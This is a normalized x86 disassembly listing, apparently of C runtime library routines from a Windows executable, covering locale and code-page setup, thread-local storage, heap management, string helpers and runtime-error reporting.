cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_40304f
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_4030e2
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_405830
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_40304f
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40357b
push 0x14
push r--data
call sub_402e60
or [ ebp - 0x20 ] 0xffffffff
call sub_403c1c
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_403272
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_403316
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_402a61
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_402ea5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_403392
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_40515f
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_4040eb
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_4040eb
pop ecx
push 0xd
call sub_4052ec
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4036dc
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_4040eb
pop ecx
sub_403733
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_4037c2
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_40385b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_4040eb
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_4040eb
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_4040eb
push [ esi + 0xc0 ]
call sub_4040eb
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_405c1e
push [ esi + 0xd4 ]
call sub_4040eb
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_4040eb
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4040eb
pop ecx
push [ esi + 0xb0 ]
call sub_4040eb
push [ esi + 0xbc ]
call sub_4040eb
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4040eb
push [ esi + 0xbc ]
call sub_405ffe
pop ecx
pop ecx
push eax
call sub_4040eb
pop ecx
push eax
call sub_4040eb
push [ esi + 0xbc ]
call sub_405f95
pop ecx
pop ecx
sub_4039a6
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_403733
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_4037c2
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_40385b
pop ecx
sub_4039f3
push 0xc
push r--data
call sub_402e60
call sub_403c1c
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_4052ec
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_4039a6
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403a60
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_403c1c
mov esi [ eax + 0x6c ]
mov eax esi
call sub_402ea5
retn
push 0x20
call sub_402e40
sub_403a7e
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_403ab2
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_4040eb
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_403aef
push 0x8
push r--data
call sub_402e60
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_4052ec
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403b91
push 0xc
call sub_4052ec
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_403733
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403b9a
call sub_402ea5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_403ba3
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_403a7e
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_402aa6
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_4040eb
pop ecx
xor esi esi
push 0x0
push esi
call sub_403aef
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_403c36
push 0x8
push r--data
call sub_402e60
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_402ea5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_4040eb
pop ecx
push 0xd
call sub_4052ec
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_4040eb
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403d50
push 0xc
call sub_4052ec
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_403d5c
push esi
call sub_4040eb
pop ecx
push edi
call sub_4037c2
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_4040eb
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_40385b
pop ecx
sub_403d65
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_403ab2
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_403a75
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_402bc8
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_405172
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_403ab2
mov edi [ DecodePointer@IAT ]
push sub_403c36
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_402aa6
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_403aef
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_403ee0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_4060fc
pop ecx
pop ecx
sub_403f0f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_403f64
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_40515f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_40515f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_40510d
mov eax esi
jmp r-xdata
sub_403fc3
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_4042c7
pop ecx
call sub_40515f
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_404560
push 0x1e
call sub_4043b1
push 0xff
call sub_402b9e
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_40515f
mov [ eax ] esi
push ebx
call sub_4042c7
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_40515f
mov [ eax ] esi
sub_404060
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4040eb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_40515f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40511d
pop ecx
mov [ esi ] eax
pop esi
sub_4041ba
push 0xc
push r--data
call sub_402e60
push 0xe
call sub_4052ec
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404221
call sub_402ea5
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_4040eb
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_4040eb
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_404230
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_4042c7
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_4042ef
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_40433b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_404125
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_40438b
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_4043b1
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40438b
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
push 0x3
call sub_40647b
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_40647b
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_406418
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_404060
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_4050bb
push esi
call sub_4063fd
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_406418
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_4062bb
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_4063fd
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_406330
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_4062bb
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_40614f
add esp 0xc
jmp r-xdata
sub_404560
push 0x3
call sub_40647b
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_4043b1
push 0xff
call sub_4043b1
pop ecx
pop ecx
push 0x3
call sub_40647b
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_404599
mov edi edi
push ebp
mov ebp esp
push esi
call sub_403ba3
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_4046e3
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_403715
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_40650d
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_404742
